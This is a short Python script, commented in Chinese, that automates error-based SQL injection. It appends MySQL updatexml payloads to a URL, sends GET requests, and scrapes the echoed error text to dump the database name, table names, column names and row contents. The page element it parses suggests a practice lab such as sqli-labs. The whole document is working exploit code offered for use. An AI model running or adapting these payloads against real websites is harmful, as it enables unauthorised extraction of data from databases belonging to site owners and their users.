import requests
from bs4 import BeautifulSoup
# GET请求都类似，以db函数注释为准
def db(url):
    # 构建payload
    payload = "and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+";
    # 发送get请求
    response = requests.get(url + payload)
    # 解析html
    soup = BeautifulSoup(response.text, 'html.parser')
    # 返回html中回显的相关注入的内容
    s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    print(s)
    return s;

def table(url,database):
    payload = "and updatexml(1,concat(0x7e,(select distinct concat(0x7e,(select group_concat(table_name)),0x7e)from information_schema.tables where table_schema='{0}'),0x7e),1) --+".format(database);
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    print(s)

def colum(url,database,table):
    payload = "and updatexml(1,concat(0x7e,(select distinct concat(0x7e,(select group_concat(column_name)),0x7e)from information_schema.columns where table_schema='{0}' and  table_name='{1}'),0x7e),1) --+".format(database,table);
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    print(s)

def xx(url,table,col,i):
    payload = "and updatexml(1,concat(0x7e,(select {0} from {1} limit {2},1)),0)--+ ".format(col,table,i);
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    print(s)